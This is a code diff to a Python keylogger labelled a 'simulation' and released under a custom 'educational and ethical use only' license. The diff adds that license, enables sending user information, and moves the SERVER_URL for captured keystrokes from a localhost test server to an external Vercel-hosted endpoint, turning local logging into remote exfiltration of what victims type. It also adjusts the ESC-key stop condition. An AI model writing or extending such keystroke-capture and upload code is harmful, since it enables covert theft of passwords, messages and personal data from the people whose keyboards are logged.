@@ -1,3 +1,32 @@
+"""
+Keystroke logger simulation by SudoHopeX
+----------------------------------------------------------------------------
+
+MIT License
+Copyright (c) 2025 SudoHopeX
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software for educational and ethical use only, including without limitation the rights
+to use, copy, modify, merge, publish (not for sell), and distribute copies of the Software without taking cost, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+This software is strictly for educational and ethical purposes. Any person wishing to use it for malicious purposes is kindly requested not to use it.
+The software may not be sold or sublicensed without explicit written permission from the copyright holder.
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+"""
+
+
 import os
 import logging
 import threading
@@ -12,8 +41,8 @@ import base64
 
 
 # Configuration
-LOG_FILE = "files/keylogs.txt"
-SERVER_URL = "http://127.0.0.1:5000"  # server URL
+LOG_FILE = "keylogs.txt"
+SERVER_URL = "https://sudohopex-smrti-log.vercel.app"  # server URL
 USER_INFO_SEND = True   # send user info or not
 send_timer = None       # Timer for periodic sending
 log_buffer = []         # Buffer to hold keystrokes before sending
@@ -139,7 +168,7 @@ def on_press(key):
     try:
 
         # Check for ESC key first
-        if key == keyboard.Key.esc:
+        if key == keyboard.Key.esc or key.char == '<esc>':
             send_logs()  # Send final logs
             # Cancel all timer threads
             for thread in threading.enumerate():
